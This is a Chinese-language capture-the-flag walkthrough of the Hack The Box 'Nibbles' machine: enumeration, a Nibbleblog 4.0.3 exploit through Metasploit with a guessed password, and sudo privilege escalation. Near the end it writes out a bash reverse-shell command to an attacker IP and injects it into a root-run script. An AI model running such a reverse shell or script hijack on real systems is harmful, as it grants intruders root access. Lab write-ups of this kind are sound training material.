# Nibbles

- **Nibbles是hackthebox中的一台简单靶机**

- nmap查看靶机端口以及漏洞

![image-20211013092148207](http://cdn.mxrblog.cn/image-20211013092148207.png)

- 使用nmap发现靶机开启了22号和80端口，开启了ssh服务和http服务，但通过nmap未发现什么漏洞
- 使用web浏览器打开靶机80端口

![image-20211013092010736](http://cdn.mxrblog.cn/image-20211013092010736.png)

- 只有一句Hello world! 没什么其他有用的东西
- 使用dirsearch和gobuster查看网页目录，发现没什么有价值的东西

![image-20211013093528608](http://cdn.mxrblog.cn/image-20211013093528608.png)

- 再次回到网页，查看网页的html，这次有了提示——一行注释：提醒我们nibbleblog这个子目录可能存在什么东西

![image-20211013093427695](http://cdn.mxrblog.cn/image-20211013093427695.png)

- 查看http://10.10.10.75/nibbleblog/

![image-20211013093849097](http://cdn.mxrblog.cn/image-20211013093849097.png)

- 再次使用dirsearch扫描

![image-20211013122037090](http://cdn.mxrblog.cn/image-20211013122037090.png)

- 查看readme文件内容

![image-20211013122137510](http://cdn.mxrblog.cn/image-20211013122137510.png)

- 给出了一个4.0.3版本，上网搜索nibbleblog知道这是一个博客引擎，searchsploit查看一下是否存在漏洞

![image-20211013122314599](http://cdn.mxrblog.cn/image-20211013122314599.png)

- 通过searchsploit搜索得知我们可以使用msf来完成渗透

![image-20211013122743444](http://cdn.mxrblog.cn/image-20211013122743444.png)

- 密码为nibbles  （**猜测出来的**）

![image-20211013154254549](http://cdn.mxrblog.cn/image-20211013154254549.png)

- 使用python获取交互式界面

`python3 -c 'import pty; pty.spawn("/bin/bash")'`

- 获得user.txt

![image-20211013154832647](http://cdn.mxrblog.cn/image-20211013154832647.png)

- 查看是否有可以使用的root权限命令

![image-20211013155458111](http://cdn.mxrblog.cn/image-20211013155458111.png)

- 将反弹shell命令写入monitor.sh脚本中，kali打开nc监听

```
echo "#! /bin/bash" > monitor.sh
echo "/bin/bash -i >& /dev/tcp/10.10.14.23/4444 0>&1" > monitor.sh
//echo "su" >> monitor.sh  这样执行后无需反弹shell直接能获取root权限 
```

![image-20211013162727965](http://cdn.mxrblog.cn/image-20211013162727965.png)

![image-20211013162851253](http://cdn.mxrblog.cn/image-20211013162851253.png)



